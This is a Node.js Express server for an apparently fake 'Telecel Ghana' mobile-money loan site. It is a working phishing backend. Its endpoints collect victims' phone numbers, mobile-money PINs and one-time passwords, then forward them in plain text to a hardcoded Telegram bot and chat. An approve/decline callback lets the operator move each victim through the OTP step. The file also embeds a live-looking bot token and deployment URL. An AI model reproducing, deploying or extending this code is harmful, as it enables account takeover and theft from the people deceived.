const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Configuration - GHANA TELECEL
const TELEGRAM_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const TELEGRAM_CHAT_ID = '6414813627';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const DB_PATH = '/tmp/loans.db';
let db = null;

async function initDatabase() {
    try {
        db = await open({ filename: DB_PATH, driver: sqlite3.Database });
        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE,
                phone TEXT,
                pin TEXT,
                network TEXT,
                amount INTEGER,
                duration INTEGER,
                monthly_payment INTEGER,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
        `);
        console.log('✅ Database initialized');
        return true;
    } catch (error) {
        console.error('❌ Database error:', error);
        return false;
    }
}

async function sendTelegramMessage(text, replyMarkup) {
    try {
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML',
                reply_markup: replyMarkup
            })
        });
        const data = await response.json();
        if (data.ok) console.log('✅ Telegram sent');
        else console.error('Telegram error:', data);
        return data.ok;
    } catch (error) {
        console.error('Telegram error:', error);
        return false;
    }
}

function generateLoanId() {
    return `TGH${Date.now().toString(36)}${Math.random().toString(36).substring(2, 8)}`.toUpperCase();
}

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.post('/api/save-loan', async (req, res) => {
    try {
        const { phone, pin, network, amount, duration, monthly } = req.body;
        const loanId = generateLoanId();
        
        if (db) {
            await db.run(`INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
                [loanId, phone, pin, network, amount, duration, monthly, 'pending']);
            console.log(`✅ Loan saved: ${loanId}`);
        }
        
        const messageText = `<b>🔴 NEW LOAN - GHANA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> GHS ${amount}\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
            `<b>📅 Duration:</b> ${duration/30} months\n` +
            `<b>💳 Monthly:</b> GHS ${monthly}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ Action Required:</b>`;
        
        const replyMarkup = {
            inline_keyboard: [[
                { text: "✅ Approve Loan", callback_data: `approve_${loanId}` },
                { text: "❌ Decline", callback_data: `decline_${loanId}` }
            ]]
        };
        
        await sendTelegramMessage(messageText, replyMarkup);
        res.json({ success: true, loanId });
    } catch (error) {
        console.error('Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        console.log('📨 Webhook received');
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const callbackId = update.callback_query.id;
            const [action, loanId] = callbackData.split('_');
            
            console.log(`🎯 Action: ${action}, LoanId: ${loanId}`);
            
            if (action === 'approve' && db) {
                await db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
                console.log(`✅ Loan ${loanId} APPROVED`);
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: "✅ Loan Approved! User can now proceed."
                    })
                });
            } else if (action === 'decline' && db) {
                await db.run(`UPDATE loans SET status = 'declined' WHERE loan_id = ?`, [loanId]);
                console.log(`❌ Loan ${loanId} DECLINED`);
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: "❌ Loan Declined"
                    })
                });
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(200);
    }
});

app.post('/api/save-otp', async (req, res) => {
    try {
        const { loanId, otp, phone } = req.body;
        console.log(`🔐 OTP entered - Loan: ${loanId}, Phone: ${phone}, OTP: ${otp}`);
        
        const messageText = `<b>🔐 OTP ENTERED - GHANA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔑 OTP Code:</b> <code>${otp}</code>\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>✅ User is completing the loan process.</b>`;
        
        await sendTelegramMessage(messageText, null);
        res.json({ success: true });
    } catch (error) {
        console.error('Save OTP error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/loan/:loanId', async (req, res) => {
    try {
        if (!db) return res.json({ success: true, loan: { status: 'pending' } });
        const loan = await db.get(`SELECT status FROM loans WHERE loan_id = ?`, [req.params.loanId]);
        res.json({ success: true, loan: loan || { status: 'pending' } });
    } catch (error) {
        res.json({ success: true, loan: { status: 'pending' } });
    }
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
app.get('/verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'verify.html')); });
app.get('/otp.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'otp.html')); });

async function startServer() {
    const dbInit = await initDatabase();
    if (!dbInit) {
        console.log('⚠️ Database warning - continuing anyway');
    }
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Telecel Ghana Server running on port ${PORT}`);
        console.log(`📍 URL: https://ghanatelecelcash-production.up.railway.app`);
    });
}

startServer();
